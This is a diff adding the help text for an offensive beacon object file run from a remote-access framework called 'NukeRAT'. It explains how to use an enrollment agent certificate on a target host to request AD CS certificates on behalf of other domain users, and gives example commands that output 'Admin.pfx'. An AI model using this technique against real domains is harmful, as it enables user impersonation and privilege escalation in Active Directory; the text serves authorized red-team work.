@@ -1,0 +1,21 @@
+ABOUT
+    Request an AD CS enrollment certificate on behalf of another user using an enrollment
+    agent certificate with XCN_OID_ENROLLMENT_AGENT extension.
+
+USAGE:
+    bof-adnet-on-behalf --- <TEMPLATE> <REQUESTER> <ENROLLMENT_AGENT.pfx> <Download_Name>
+
+    TEMPLATE              Certificate template to request
+    REQUESTER             Domain\username to request on behalf of
+    ENROLLMENT_AGENT.pfx  Path to enrollment agent .pfx on target host
+    Download_Name         Filename for downloaded PFX output
+
+EXAMPLES:
+    bof-adnet-on-behalf --- User mini.lab\\bob C:\\temp\\enroll.pfx Admin.pfx
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-adnet-on-behalf -w 60 --- User mini.lab\\bob C:\\temp\\enroll.pfx Admin.pfx
